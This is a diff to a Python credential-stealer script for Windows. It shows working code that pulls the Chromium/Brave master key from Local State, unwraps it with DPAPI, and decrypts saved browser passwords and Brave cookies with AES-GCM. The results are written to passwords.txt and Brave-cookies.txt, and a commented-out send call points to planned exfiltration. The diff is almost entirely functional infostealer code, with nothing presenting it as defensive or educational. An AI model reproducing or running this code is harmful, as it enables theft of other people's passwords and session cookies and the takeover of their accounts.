@@ -10,16 +10,48 @@ import win32crypt
 import sys
 
 
-##
-##Extract passwords
-##
-
 def delete_file(file):
     try:
         os.remove(file)
         #os.remove("passwords.txt")
     except:
         pass
+
+def store_data(file, data):
+    with open(file, 'a') as f:
+        f.write("\n##########################################")
+        f.write(data)
+        f.write("##########################################")
+
+def fetch_key(key_dir):
+    try:
+        try:
+            dir_path = os.path.join(os.environ["USERPROFILE"], key_dir)
+        except:
+            return
+            
+        with open(dir_path, "r", encoding="utf-8") as f:
+            local_state_data = f.read()
+            local_state_data = json.loads(local_state_data)
+
+        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
+        key = key[5:]
+
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    except:
+        return
+
+def decrypt_string(string, key):
+    try:
+        i = string[3:15]
+        string = string[15:]
+        cipher = AES.new(key, AES.MODE_GCM, i)
+        return cipher.decrypt(string)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(string, None, None, None, 0)[1])
+        except:
+            return "String could not be decrypted or none were found!"
 
 #def get_url():
 #   try:
@@ -46,7 +78,10 @@ def delete_file(file):
 #        except:
 #            return
         
-        
+##
+##Extract passwords
+##
+  
 def load_path(id):
     try:
         with open("todo.txt", "r") as f:
@@ -61,46 +96,6 @@ def load_path(id):
         return dir_path
     elif id == "db":
         return db_path
-
-
-def store_data(file, data):
-    with open(file, 'a') as f:
-        f.write("\n##########################################")
-        f.write(data)
-        f.write("##########################################")
-
-
-def fetch_key(key_dir):
-    try:
-        try:
-            dir_path = os.path.join(os.environ["USERPROFILE"], key_dir)
-        except:
-            return
-            
-        with open(dir_path, "r", encoding="utf-8") as f:
-            local_state_data = f.read()
-            local_state_data = json.loads(local_state_data)
-
-        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
-        key = key[5:]
-
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except:
-        return
-
-
-def decrypt_password(password, key):
-    try:
-        i = password[3:15]
-        password = password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, i)
-        
-        return cipher.decrypt(password)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except:
-            return "Password could not be decrypted or none were found!"
 
 def save_passwords(db_dir, key_dir):
     try:
@@ -125,8 +120,8 @@ def save_passwords(db_dir, key_dir):
         date_created = row[4]
         last_usage = row[5]
 
-        if username or decrypt_password(row[3], fetch_key(key_dir)):
-            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
+        if username or decrypt_string(row[3], fetch_key(key_dir)):
+            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
             store_data("passwords.txt", data)
         else:
             continue
@@ -139,7 +134,7 @@ def save_passwords(db_dir, key_dir):
     delete_file(file)
     #send("passwords.txt")
 
-save_passwords(load_path("db"), load_path("dir"))
+#save_passwords(load_path("db"), load_path("dir"))
 
 ##
 ##Extract cookies
@@ -154,22 +149,43 @@ def fetch_cookies(dir):
         cursor = conn.execute(query)
     except:
         pass
-    
-    #cookies = []
-
     try:
         for row in cursor:
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
             
             cookie = f"\nName: {name}\nValue: {value}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
-            #cookies.append(cookie)
             store_data("cookies.txt", cookie)
         conn.close()
     except:
         pass
-    #return cookies
 
-fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+#fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+
+##
+##Extract Brave cookies and decrypt them
+##
+
+def d_fetch_cookies(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
+
+        conn = sqlite3.connect(file)
+        query = 'SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
+        cursor = conn.execute(query)
+    except:
+        pass
+    key = fetch_key(load_path("dir"))
+    try:
+        for row in cursor:
+            name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
+            
+            cookie = f"\nName: {name}\nValue: {decrypt_string(value, key)}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
+            store_data("Brave-cookies.txt", cookie)
+        conn.close()
+    except:
+        pass
+
+#d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
 
 ##
 ##Extract history
